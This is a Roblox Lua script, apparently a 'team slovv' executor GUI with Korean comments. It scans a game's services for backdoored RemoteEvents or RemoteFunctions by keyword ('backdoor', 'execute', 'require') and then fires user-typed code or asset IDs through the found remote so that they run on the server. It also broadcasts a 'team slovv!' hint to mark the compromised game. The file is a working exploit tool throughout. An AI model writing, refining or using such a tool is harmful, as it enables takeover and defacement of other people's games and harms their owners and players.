-- KAW GUI - team slovv 문법 및 입력창 오류 완전 해결 버전
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")

if CoreGui:FindFirstChild("KAW_GUI_Optimized") then
    CoreGui.KAW_GUI_Optimized:Destroy()
end

-- 1. 메인 베이스 프레임 (모던 플랫 디자인)
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "KAW_GUI_Optimized"
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 520, 0, 310)
MainFrame.Position = UDim2.new(0.5, -260, 0.5, -155)
MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true

local MainCorner = Instance.new("UICorner", MainFrame)
MainCorner.CornerRadius = UDim.new(0, 12)

-- 백도어 감지 시 내 GUI에 나타날 상단 검정색 바
local SfsBar = Instance.new("Frame", MainFrame)
SfsBar.Size = UDim2.new(1, 0, 0, 0) 
SfsBar.Position = UDim2.new(0, 0, 0, 0)
SfsBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0) 
SfsBar.BorderSizePixel = 0
SfsBar.ZIndex = 5 
SfsBar.ClipsDescendants = true 

local SfsLabel = Instance.new("TextLabel", SfsBar)
SfsLabel.Size = UDim2.new(1, 0, 1, 0)
SfsLabel.BackgroundTransparency = 1
SfsLabel.Text = "team slovv" 
SfsLabel.Font = Enum.Font.BuilderSansBold
SfsLabel.TextSize = 16
SfsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
SfsLabel.TextTransparency = 1 
SfsLabel.ZIndex = 6

-- 부드러운 트윈 애니메이션 함수
local function tween(object, info, properties)
    local t = TweenService:Create(object, info, properties)
    t:Play()
    return t
end
local tInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

-- UserInputService 기반 부드러운 드래그 로직
local dragging, dragInput, dragStart, startPos
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- GUI 토글 기능 (오른쪽 Shift 키)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.RightShift then
        ScreenGui.Enabled = not ScreenGui.Enabled
    end
end)

-- 2. 타이틀 및 버튼 스타일링 
local TitleLabel = Instance.new("TextLabel", MainFrame)
TitleLabel.Size = UDim2.new(0, 240, 0, 80)
TitleLabel.Position = UDim2.new(0, 15, 0, 30) 
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "slovv" 
TitleLabel.Font = Enum.Font.BuilderSansMedium
TitleLabel.TextSize = 42
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left

local ScanButton = Instance.new("TextButton", MainFrame)
ScanButton.Size = UDim2.new(0, 240, 0, 110)
ScanButton.Position = UDim2.new(0, 15, 0, 160)
ScanButton.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
ScanButton.BorderSizePixel = 0
ScanButton.Text = "Start Scanning"
ScanButton.Font = Enum.Font.BuilderSansMedium
ScanButton.TextSize = 22
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanButton.TextWrapped = true

local BtnCorner = Instance.new("UICorner", ScanButton)
BtnCorner.CornerRadius = UDim.new(0, 10)

-- 3. 우측 영역: 입력 필드 및 실행 버튼 (입력 차단 및 버그 완전 해결)
local CodeInput = Instance.new("TextBox", MainFrame)
CodeInput.Size = UDim2.new(0, 235, 0, 180)
CodeInput.Position = UDim2.new(0, 270, 0, 25)
CodeInput.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
CodeInput.BorderSizePixel = 0
CodeInput.TextColor3 = Color3.fromRGB(240, 240, 240)
CodeInput.Font = Enum.Font.Code
CodeInput.TextSize = 11
CodeInput.TextXAlignment = Enum.TextXAlignment.Left
CodeInput.TextYAlignment = Enum.TextYAlignment.Top
CodeInput.MultiLine = true 

CodeInput.Text = "" 
CodeInput.ClearTextOnFocus = false
CodeInput.Active = true
CodeInput.Selectable = true

local CodeCorner = Instance.new("UICorner", CodeInput)
CodeCorner.CornerRadius = UDim.new(0, 8)

local CodePadding = Instance.new("UIPadding", CodeInput)
CodePadding.PaddingLeft = UDim.new(0, 8)
CodePadding.PaddingTop = UDim.new(0, 8)

local ExecButton = Instance.new("TextButton", MainFrame)
ExecButton.Size = UDim2.new(0, 235, 0, 45)
ExecButton.Position = UDim2.new(0, 270, 0, 225)
ExecButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ExecButton.BorderSizePixel = 0
ExecButton.Text = "실행하기" 
ExecButton.Font = Enum.Font.BuilderSansMedium
ExecButton.TextSize = 18
ExecButton.TextColor3 = Color3.fromRGB(255, 255, 255)

local ExecCorner = Instance.new("UICorner", ExecButton)
ExecCorner.CornerRadius = UDim.new(0, 8)


-- 4. 백도어 및 취약 채널 정밀 탐색 알고리즘
local activeRemote = nil
local isScanning = false

ScanButton.MouseButton1Click:Connect(function()
    if isScanning then return end
    isScanning = true
    
    ScanButton.Text = "Scanning..."
    tween(ScanButton, tInfo, {BackgroundColor3 = Color3.fromRGB(50, 30, 30)})
    
    tween(SfsBar, tInfo, {Size = UDim2.new(1, 0, 0, 0)})
    tween(SfsLabel, tInfo, {TextTransparency = 1})
    
    local oldHint = Workspace:FindFirstChild("SlovvGlobalNoticeBar")
    if oldHint then oldHint:Destroy() end
    
    task.wait(0.3)
    activeRemote = nil
    
    local targetKeywords = {"weld", "joint", "execute", "backdoor", "run", "gg", "sync", "require", "load", "mbackdoor"}
    
    local function checkItem(item)
        if item:IsA("RemoteEvent") or item:IsA("RemoteFunction") then
            local n = item.Name:lower()
            for _, keyword in ipairs(targetKeywords) do
                if n:find(keyword) then
                    activeRemote = item
                    return true
                end
            end
            if not activeRemote and item:IsA("RemoteEvent") then
                activeRemote = item
            end
        end
        return false
    end

    local essentialServices = {
        game:GetService("ReplicatedStorage"),
        game:GetService("JointsService"),
        game:GetService("Workspace"),
        game:GetService("LogService"),
        game:GetService("HttpService"),
        game:GetService("Teams"),
        game:GetService("Lighting")
    }

    for _, service in ipairs(essentialServices) do
        pcall(function()
            for _, item in ipairs(service:GetDescendants()) do
                if checkItem(item) then break end
            end
        end)
        if activeRemote then break end
    end
    
    if activeRemote then
        ScanButton.Text = "FOUND:\n" .. activeRemote.Name
        tween(ScanButton, tInfo, {BackgroundColor3 = Color3.fromRGB(25, 70, 35)})
        
        tween(SfsBar, tInfo, {Size = UDim2.new(1, 0, 0, 26)})
        tween(SfsLabel, tInfo, {TextTransparency = 0})
        
        pcall(function()
            local GlobalHint = Instance.new("Hint")
            GlobalHint.Name = "SlovvGlobalNoticeBar"
            GlobalHint.Text = "team slovv!" 
            GlobalHint.Parent = Workspace 
        end)
    else
        ScanButton.Text = "NOT FOUND"
        tween(ScanButton, tInfo, {BackgroundColor3 = Color3.fromRGB(45, 45, 45)})
        task.wait(1.2)
        ScanButton.Text = "Start Scanning"
        tween(ScanButton, tInfo, {BackgroundColor3 = Color3.fromRGB(22, 22, 22)})
    end
    isScanning = false
end)

-- 5. 안전한 코드 및 페이로드 데이터 전송 로직
ExecButton.MouseButton1Click:Connect(function()
    if not activeRemote then
        ExecButton.Text = "스캔을 완료하세요!"
        tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(70, 30, 30)})
        task.wait(1.2)
        ExecButton.Text = "실행하기"
        tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)})
        return
    end
    
    local codePayload = CodeInput.Text
    
    task.spawn(function()
        local success, err = pcall(function()
            local cleanText = codePayload:gsub("%s+", "")
            local isNumeric = tonumber(cleanText)
            
            if activeRemote:IsA("RemoteEvent") then
                if isNumeric then
                    activeRemote:FireServer("require", isNumeric)
                    activeRemote:FireServer(isNumeric)
                else
                    activeRemote:FireServer(codePayload)
                    activeRemote:FireServer("execute", codePayload)
                end
            elseif activeRemote:IsA("RemoteFunction") then
                if isNumeric then
                    task.spawn(function() activeRemote:InvokeServer("require", isNumeric) end)
                    task.spawn(function() activeRemote:InvokeServer(isNumeric) end)
                else
                    task.spawn(function() activeRemote:InvokeServer(codePayload) end)
                    task.spawn(function() activeRemote:InvokeServer("execute", codePayload) end)
                end
            end
        end)
        
        if success then
            ExecButton.Text = "실행 완료!"
            tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(25, 70, 35)})
        else
            ExecButton.Text = "에러 발생"
            tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(70, 30, 30)})
            warn("통신 실패 로그: " .. tostring(err))
        end
        
        task.wait(1.5)
        ExecButton.Text = "실행하기"
        tween(ExecButton, tInfo, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)})
    end)
end)
